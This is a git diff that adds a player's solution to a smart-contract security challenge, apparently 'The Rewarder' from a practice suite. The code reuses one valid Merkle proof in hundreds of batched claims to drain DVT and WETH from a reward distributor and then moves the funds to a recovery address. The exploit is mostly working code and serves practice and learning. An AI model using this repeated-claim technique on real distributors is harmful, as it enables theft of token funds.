@@ -148,7 +148,61 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        merkle = new Merkle();
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+
+
+        uint256 claimingSize;
+        Claim[] memory claims;
+        IERC20[] memory tokensToClaim;
         
+        // Drain DVT
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        claimingSize = (TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT)/PLAYER_DVT_CLAIM_AMOUNT;
+        console.log("Claiming Size of DVT", claimingSize);
+        claims = new Claim[](claimingSize);
+        tokensToClaim = new IERC20[](claimingSize);
+        
+        tokensToClaim[0] =IERC20(address(dvt));
+        for (uint i = 0; i < claimingSize; i++) {
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, 188) // Player's address is at index 188
+                
+            });
+        }  
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        // Drain WETH
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+        claimingSize = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT)/ PLAYER_WETH_CLAIM_AMOUNT;
+        console.log("Claiming Size of WETH", claimingSize);
+        claims = new Claim[](claimingSize);
+        tokensToClaim = new IERC20[](claimingSize);
+
+        tokensToClaim[0] =IERC20(address(weth));
+        for (uint i = 0; i < claimingSize; i++) {                
+            claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, 188) // Player's address is at index 188
+                
+            });
+            tokensToClaim[i] = IERC20(address(weth));
+        }  
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+      
+        // Transfer token to recovery
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
     }
 
     /**
